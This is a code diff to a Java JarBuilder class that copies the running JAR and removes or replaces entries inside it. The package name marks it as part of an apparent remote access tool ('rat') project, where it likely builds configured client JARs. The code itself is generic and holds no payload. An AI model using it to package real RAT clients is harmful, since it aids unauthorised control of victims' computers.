@@ -5,46 +5,73 @@
 package de.sogomn.rat.util;
 
 import java.io.ByteArrayInputStream;
-import java.io.File;
 import java.io.IOException;
 import java.nio.file.FileSystem;
 import java.nio.file.FileSystems;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.Set;
 
 public final class JarBuilder {
 	
-	private JarBuilder() {
-		//...
+	private Path destination;
+	
+	private ArrayList<String> removals;
+	private HashMap<String, byte[]> replacements;
+	
+	public JarBuilder(final Path destination) {
+		this.destination = destination;
+		
+		removals = new ArrayList<String>();
+		replacements = new HashMap<String, byte[]>();
 	}
 	
-	public static void copy(final File destination) throws IOException {
-		final Path sourcePath = Constants.JAR_FILE.toPath();
-		final Path destinationPath = destination.toPath();
-		
-		Files.copy(sourcePath, destinationPath, StandardCopyOption.REPLACE_EXISTING);
+	public JarBuilder(final String destination) {
+		this(Paths.get(destination));
 	}
 	
-	public static void removeFile(final File jar, final String file) throws IOException {
-		final Path jarPath = jar.toPath();
-		final FileSystem fileSystem = FileSystems.newFileSystem(jarPath, null);
-		final Path path = fileSystem.getPath(file);
+	public JarBuilder removeFiles(final String... paths) {
+		for (final String removal : paths) {
+			removals.add(removal);
+		}
 		
-		Files.delete(path);
-		
-		fileSystem.close();
+		return this;
 	}
 	
-	public static void replaceFile(final File jar, final String replacementName, final byte[] replacementData) throws IOException {
-		final Path jarPath = jar.toPath();
-		final FileSystem fileSystem = FileSystems.newFileSystem(jarPath, null);
-		final ByteArrayInputStream in = new ByteArrayInputStream(replacementData);
-		final Path replacementPath = fileSystem.getPath(replacementName);
+	public JarBuilder replaceFile(final String path, final byte[] data) {
+		replacements.put(path, data);
 		
-		Files.copy(in, replacementPath, StandardCopyOption.REPLACE_EXISTING);
+		return this;
+	}
+	
+	public void build() throws IOException {
+		final Path sourcePath = Constants.JAR_FILE;
 		
-		in.close();
+		Files.copy(sourcePath, destination, StandardCopyOption.REPLACE_EXISTING);
+		
+		final FileSystem fileSystem = FileSystems.newFileSystem(destination, null);
+		final Set<String> replacementKeys = replacements.keySet();
+		
+		for (final String removal : removals) {
+			final Path path = fileSystem.getPath(removal);
+			
+			Files.delete(path);
+		}
+		
+		for (final String replacement : replacementKeys) {
+			final Path path = fileSystem.getPath(replacement);
+			final byte[] data = replacements.get(replacement);
+			final ByteArrayInputStream in = new ByteArrayInputStream(data);
+			
+			Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+			
+			in.close();
+		}
+		
 		fileSystem.close();
 	}
 	
